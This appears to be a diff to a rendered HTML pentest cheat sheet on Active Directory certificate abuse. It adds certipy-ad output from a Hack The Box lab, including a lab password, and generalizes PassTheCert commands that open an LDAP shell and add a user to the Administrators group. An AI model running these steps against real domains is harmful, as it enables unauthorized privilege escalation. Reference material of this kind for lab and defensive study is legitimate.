@@ -385,6 +385,15 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab1"><h4 id="1-request-a-certificate">1. Request a certificate</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad req -u &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -ca &lt;CA&gt; -template User -target &lt;DC&gt; -pfx &lt;USER&gt;.pfx
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> certipy-ad req -u <span class="s1">&#39;oorend@rebound.htb&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> -ca rebound-DC01-CA -template User -target dc01.rebound.htb -pfx oorend.pfx
+</span></span><span class="line"><span class="cl"><span class="go">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Requesting certificate via RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Successfully requested certificate
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Request ID is 7
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Got certificate with UPN &#39;oorend@rebound.htb&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Certificate object SID is &#39;S-1-5-21-4078382237-1492182817-2568127209-7682&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saved certificate and private key to &#39;oorend.pfx&#39;
 </span></span></span></code></pre></div><h4 id="2-get-ntlm-hash">2. Get NTLM hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; certipy-ad auth -pfx &lt;USER&gt;.pfx
 </span></span></span></code></pre></div></div>
@@ -502,15 +511,15 @@ body.dark-mode #dynamicFormContainer button:hover {
 <hr>
 <h3 id="workaround-kerberos-sessionerror-kdc_err_padata_type_nosupp">Workaround: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP</h3>
 <h4 id="1-create-key-and-cert-from-pfx">1. Create key and cert from pfx</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &lt;USER&gt;.pfx -nocert -out &lt;USER&gt;.key
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">certipy-ad cert -pfx &lt;USER&gt;.pfx -nokey -out &lt;USER&gt;.crt
 </span></span></span></code></pre></div><p>
 <button data-tabset="set8" data-tabcontent="tab1" class="active">LDAP Shell</button>
 
 <button data-tabset="set8" data-tabcontent="tab2" >RBCD</button>
 
 <div class="tabcontent" data-tabset="set8" data-tabcontent="tab1"><h4 id="1-get-a-ldap-shell">1. Get a LDAP shell</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt &lt;USER&gt;.crt -key &lt;USER&gt;.key -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt;
 </span></span></span></code></pre></div><h4 id="2-add-user-to-administrators-group">2. Add user to administrators group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">add_user_to_group &#39;&lt;USER&gt;&#39; administrators
 </span></span></span></code></pre></div><h4 id="3-remote">3. Remote</h4>
